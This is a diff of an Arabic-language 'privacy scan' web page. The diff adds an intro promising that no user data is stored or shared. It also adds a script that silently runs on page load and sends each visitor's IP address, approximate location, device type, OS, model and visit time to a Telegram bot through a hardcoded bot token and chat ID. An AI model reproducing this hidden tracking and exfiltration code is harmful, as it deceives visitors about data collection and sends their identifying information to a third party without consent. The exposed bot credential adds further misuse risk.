@@ -4,228 +4,159 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DEVO_63 Scan</title>
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="scan_page/style.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
 </head>
 <body>
+    <div class="container1" id="mainScreen">
+    <div class="mxw">
  <div class="logo">
           <span class="d1">D1_SCAN</span>
           <span class="beta">beta version</span>
           </div>
-    <div class="container" id="scanResults">
+        <p class="intro">
+بسم الله الرحمن الرحيم، والحمد لله رب العالمين، والصلاة والسلام على خاتم الأنبياء و المرسلين، أما بعد:
+<br>
 
+في الآونة الأخيرة، لاحظت انتشارًا واسعًا ومقلقًا لعمليات اختراق الأجهزة والحسابات وغيرها، والتي غالبًا ما تكون ناتجة عن مواقع إلكترونية. 
+<br>
 
-        <!-- معلومات الجهاز -->
-        <div class="test-card">
-            <div class="info">             <div class="header">
-                <h3>🖥️ معلومات الجهاز</h3>
-            </div>
-                <p class="status" id="deviceInfo">لم يتم الفحص بعد</p>
-            <button class="button"  onclick="fetchDeviceInfo()">ادغط للفحص</button>
+لذا، قررت أن أبدأ هذا المشروع الذي يقوم بفحص شامل لاكتشاف أي بيانات خاصة بك قد تكون ظاهرة لمالكي المواقع بشكل غير مقصود. بالإضافة إلى ذلك، سوف أجاهد لكي يكون الموبع شاملاً  لحلول هاته الثغرات الأمنية المتواجدة في جهازك، إلى جانب بعض النصائح التوعوية المهمة.
+<br>
+<strong>  🛑  مع التأكيد على أنه لا يتم تخزين أو مشاركة أي معلومات خاصة بك.</strong>
+        </p>
+       <button class="button" onclick="window.location.href='scan_page/index.html'">موافق، ابدأ</button>
+    </div></div>
 
-                <hr><div class="note">
-    🔹 <span class="red">(إذا كانت المعلومات الظاهر بعد الفحص تطابق بيانات جهازك، فقد يعني ذلك أن متصفحك يكشف بعض التفاصيل عن نظامك. بعض المواقع تستخدم هذه المعلومات لتحديد جهازك، لكن هذا لا يعني بالضرورة كشف هويتك الحقيقية.)</span><br>
-    🔹 لا تشارك معلومات جهازك مع مواقع غير موثوقة.<br>
-    🔹 استخدم متصفحًا يعزز الخصوصية مثل <strong>Firefox</strong> أو <strong>Brave</strong>، وقم بتفعيل ميزات الحماية مثل منع التتبع 
-</div>
-        </div>
-            </div>
+<script>
 
-        <!-- عنوان IP وكشف VPN -->
-        <div class="test-card">
-            <div class="info"> 
-            <div class="header">
-                <h3>🌍 عنوان IP وكشف VPN</h3>
-                </div>
-                <p class="status" id="ipInfo">لم يتم الفحص بعد</p>
-            <button class="button"  onclick="fetchIPInfo()">ادغط للفحص</button>
-                <hr><div class="note">
-                    🔹 استخدم **VPN موثوق** لإخفاء عنوان IP.<br>
-                    🔹 تحقق من إعدادات جدار الحماية لديك لمنع تسرب IP.
-                </div>
-            </div>
-        </div>
+// دالة لجمع عنوان IP
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('❌ خطأ في جلب عنوان IP:', error);
+        return null;
+    }
+}
 
-        <!-- اختبار سرعة الإنترنت
-        <div class="test-card">
+// دالة للحصول على الموقع الجغرافي بناءً على IP
+async function getLocation(ip) {
+    try {
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await response.json();
+        return `${data.city}, ${data.country_name}`;
+    } catch (error) {
+        console.error('❌ خطأ في جلب الموقع:', error);
+        return 'غير معروف';
+    }
+}
 
-            <div class="info">
-                  <div class="header">
-                <h3>⚡اختبار سرعة الإنترنت</h3>
-                </div>
-                <p class="status" id="speedResult">لم يتم الفحص بعد</p>
-            <button class="button"  onclick="testInternetSpeed()">ادغط للفحص</button>
-                <hr><div class="note">
-                    🔹 إذا كانت السرعة بطيئة، جرب **إعادة تشغيل الراوتر**.<br>
-                    🔹 تأكد من عدم تشغيل تحميلات كبيرة أثناء الاختبار.
-                </div>
-            </div>
-        </div>
- -->
-        <!-- إذن الموقع الجغرافي -->
-        <div class="test-card">
-            <div class="info"> 
-            <div class="header">
-                <h3>اذن الموقع الجغرافي  📍</h3>
-                </div>
-                <p class="status" id="locationStatus">لم يتم الفحص بعد</p>
-            <button class="button"  onclick="checkLocationPermission()">ادغط للفحص</button>
-                <hr><div class="note">
-                    🔹 قم بتعطيل **إذن الموقع** في إعدادات المتصفح إذا كنت لا تحتاجه.<br>
-                    🔹 استخدم **VPN** لإخفاء موقعك الحقيقي.
-                </div>
-            </div>
-        </div>
+// دالة لتحديد نوع الجهاز ونظام التشغيل والطراز
+function getDeviceInfo() {
+    const userAgent = navigator.userAgent;
 
+    let deviceType = 'غير معروف';
+    if (/Mobi|Android/i.test(userAgent)) {
+        deviceType = ' هاتف محمول';
+    } else if (/Tablet|iPad/i.test(userAgent)) {
+        deviceType = ' جهاز لوحي';
+    } else {
+        deviceType = ' كمبيوتر';
+    }
 
-        <!-- اختبار التصيد الاحتيالي -->
+    let os = 'غير معروف';
+    if (/Android/i.test(userAgent)) {
+        os = ' Android';
+    } else if (/iOS|iPhone|iPad/i.test(userAgent)) {
+        os = 'iOS';
+    } else if (/Windows/i.test(userAgent)) {
+        os = ' Windows';
+    } else if (/Mac/i.test(userAgent)) {
+        os = ' macOS';
+    } else if (/Linux/i.test(userAgent)) {
+        os = ' Linux';
+    }
 
-        <!-- اختبار Clipboard Hijacking -->
-        <div class="test-card">
-            <div class="info">
-                <div class="header"><h3>📜 اختبار سرقة الحافظة (Clipboard)</h3></div>
-                <p class="status" id="clipboardTest">لم يتم الفحص بعد</p>
-                <button class="button" onclick="testClipboard()">اضغط للفحص</button>
-                <hr>
-                <div class="note">
-                    ✅ لا تنسخ بيانات حساسة أثناء تصفح المواقع المشبوهة<br>
-                    ✅ استخدم إضافات تمنع المواقع من قراءة الحافظة
-                </div>
-            </div>
-        </div>
+    let deviceModel = 'غير متوفر';
+    if (/Android/i.test(userAgent)) {
+        const modelMatch = userAgent.match(/Build\/([^;]+)/);
+        if (modelMatch) {
+            deviceModel = modelMatch[1].split(';')[0].trim();
+        }
+    } else if (/iPhone|iPad/i.test(userAgent)) {
+        const modelMatch = userAgent.match(/iPhone|iPad/);
+        if (modelMatch) {
+            deviceModel = modelMatch[0];
+        }
+    }
 
-        <!-- اختبار WebRTC -->
-        <div class="test-card">
-            <div class="info">
-                <div class="header"><h3>🔍 اختبار كشف عنوان IP عبر WebRTC</h3></div>
-                <p class="status" id="webrtcTest">لم يتم الفحص بعد</p>
-                <button class="button" onclick="testWebRTC()">اضغط للفحص</button>
-                <hr>
-                <div class="note">
-                    ✅ استخدم VPN لحماية عنوان IP الحقيقي<br>
-                    ✅ عطّل WebRTC في إعدادات متصفحك
-                </div>
-            </div>
-        </div>
+    return { deviceType, os, deviceModel };
+}
 
-        <!-- اختبار Canvas Fingerprinting -->
-        <div class="test-card">
-            <div class="info">
-                <div class="header"><h3>🖼️ اختبار تعقبك عبر Canvas</h3></div>
-                <p class="status" id="canvasTest">لم يتم الفحص بعد</p>
-                <button class="button" onclick="testCanvasFingerprinting()">اضغط للفحص</button>
-                <hr>
-                <div class="note">
-                    ✅ استخدم متصفحات تحمي من التعقب مثل Brave<br>
-                    ✅ قم بتثبيت إضافات منع التتبع
-                </div>
-            </div>
-        </div>
+// دالة لإرسال البيانات إلى Telegram باستخدام HTML
+async function sendToBot(message) {
+    const botToken = '7642723730:AAHLXI_yDwCV-1WOwY_8LQ2fBplaUB4sQ-I'; // استبدل هذا بتوكين البوت
+    const chatId = '5962064921'; // استبدل هذا بـ chat_id الخاص بك
 
-        <!-- اختبار الوصول إلى الكاميرا والميكروفون -->
-        <div class="test-card">
-            <div class="info">
-                <div class="header"><h3>📷 اختبار وصول المواقع للكاميرا والميكروفون</h3></div>
-                <p class="status" id="cameraTest">لم يتم الفحص بعد</p>
-                <button class="button" onclick="testCameraAccess()">اضغط للفحص</button>
-                <hr>
-                <div class="note">
-                    ✅ لا تمنح الإذن إلا للمواقع الموثوقة<br>
-                    ✅ راجع الأذونات في إعدادات المتصفح باستمرار
-                </div>
-            </div>
-        </div>
-<!-- اختبار قراءة الكوكيز -->
-<div class="test-card">
-    <div class="info">
-        <div class="header"><h3>🍪 اختبار قراءة الكوكيز</h3></div>
-        <p class="status" id="cookiesTest">لم يتم الفحص بعد</p>
-        <button class="button" onclick="testCookies()">اضغط للفحص</button>
-        <hr>
-        <div class="note">
-            ✅ استخدم وضع التصفح الخفي لحماية بياناتك<br>
-            ✅ قم بمسح الكوكيز من وقت لآخر لمنع تتبعك
-        </div>
-    </div>
-</div>        
-        
-        <div class="test-card">
-    <div class="info">
-        <div class="header"><h3>🕵️‍♂️ اختبار تسريب WebRTC</h3></div>
-        <p class="status" id="webrtcTest">لم يتم الفحص بعد</p>
-        <button class="button" onclick="testWebRTC()">اختبار</button>
-        <hr>
-        <div class="note">
-            🔹 لتعطيل WebRTC، استخدم إضافة مثل **uBlock Origin**<br>
-            🔹 في **Firefox**: اكتب `about:config` وابحث عن `media.peerconnection.enabled` ثم اجعله **false**.
-        </div>
-    </div>
-</div>
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML' // استخدام HTML لتحسين التنسيق
+            })
+        });
 
-<div class="test-card">
-    <div class="info">
-        <div class="header"><h3>🔍 اختبار تجسس سجل التصفح</h3></div>
-        <p class="status" id="historyTest">لم يتم الفحص بعد</p>
-        <button class="button" onclick="testHistorySniffing()">اختبار</button>
-        <hr>
-        <div class="note">
-            🔹 استخدم متصفحًا يمنع هذه الثغرة مثل **Firefox**.<br>
-            🔹 قم بمسح سجل التصفح بشكل دوري.
-        </div>
-    </div>
-</div>
-<!-- 📝 اختبار الملء التلقائي -->
-<div class="test-card">
-    <div class="info">
-        <div class="header"><h3>📝 اختبار الملء التلقائي</h3></div>
-        <p class="status" id="autofillResult">لم يتم الفحص بعد</p>
-        <form id="autofillTestForm">
-            <input type="hidden" type="text" name="username" autocomplete="username" placeholder="اسم المستخدم">
-            <input type="hidden" type="password" name="password" autocomplete="current-password" placeholder="كلمة المرور">
-        </form>
-        <button class="button" onclick="testAutofill()">اضغط للفحص</button>
-        <hr>
-        <div class="note">
-            ⚠️ تجنب تفعيل الملء التلقائي على الأجهزة العامة<br>
-            ✅ استخدم مدير كلمات مرور موثوق بدلاً من المتصفح
-        </div>
-    </div>
-</div>
+        const data = await response.json();
+        if (data.ok) {
+            console.log('✅ تم إرسال البيانات إلى البوت بنجاح!');
+        } else {
+            console.error('❌ فشل إرسال البيانات:', data);
+        }
+    } catch (error) {
+        console.error('🚨 حدث خطأ أثناء الإرسال:', error);
+    }
+}
 
-<!-- 🔊 اختبار بصمة الصوت -->
-<div class="test-card">
-    <div class="info">
-        <div class="header"><h3>🔊 اختبار بصمة الصوت</h3></div>
-        <p class="status" id="audioFingerprintResult">لم يتم الفحص بعد</p>
-        <button class="button" onclick="testAudioFingerprint()">اضغط للفحص</button>
-        <hr>
-        <div class="note">
-            ⚠️ بعض المواقع تستخدم بصمة الصوت لتتبعك بدون إذن<br>
-            ✅ استخدم إضافات تمنع **AudioContext** إذا كنت تهتم بالخصوصية
-        </div>
-    </div>
-</div>
+// الكود الرئيسي
+window.onload = async function() {
+    const startTime = new Date(); // وقت بدء الجلسة
 
-<!-- 🖥️ اختبار اختراق التبويبات -->
-<div class="test-card" id="test">
-    <div class="info">
-        <div class="header"><h3>🖥️ اختبار اختراق التبويبات</h3></div>
-        <p class="status" id="tabnabbingResult">لم يتم الفحص بعد</p>
-        <button class="button" onclick="testReverseTabnabbing()">افتح التبويب</button>
-        <hr>
-        <div class="note">
-            ⚠️ لا تضغط على روابط مشبوهة تفتح في تبويب جديد<br>
-            ✅ استخدم إضافات تمنع **Reverse Tabnabbing**
-        </div>
-    </div>
-</div>
+    // جمع المعلومات
+    const ipAddress = await getIPAddress();
+    const location = ipAddress ? await getLocation(ipAddress) : 'غير معروف';
+    const { deviceType, os, deviceModel } = getDeviceInfo();
+    const siteURL = window.location.href; // الحصول على رابط الموقع الحالي
 
-    </div>
-<footer>
-    <p>Developed and designed by 
-        <a href="https://dyaa-edin.netlify.app" target="_blank">@devo_63</a>
-    </p>
-</footer>
-    <script src="script.js"></script>
+    // فصل التاريخ والوقت
+    const entryDate = startTime.toLocaleDateString(); // تاريخ الدخول
+    const entryTime = startTime.toLocaleTimeString(); // وقت الدخول
+
+    // تنسيق الرسالة باستخدام HTML
+    const entryMessage = `
+📢 <b>دخول جديد إلى الموقع!</b>
+
+🆔 <b>عنوان IP:</b> <code>${ipAddress || 'غير معروف'}</code>  
+🌍 <b>الموقع:</b> <code>${location}</code>  
+📱 <b>نوع الجهاز:</b> <code>${deviceType}</code>  
+🖥 <b>نظام التشغيل:</b> <code>${os}</code>  
+🔍 <b>طراز الجهاز:</b> <code>${deviceModel}</code>  
+
+📅 <b>تاريخ الدخول:</b> <code>${entryDate}</code>  
+⏰ <b>وقت الدخول:</b> <code>${entryTime}</code>  
+🔗 <b>رابط الموقع:</b> <a href="${siteURL}">${siteURL}</a>  
+    `;
+
+    await sendToBot(entryMessage);
+};
+</script>
 </body>
 </html>
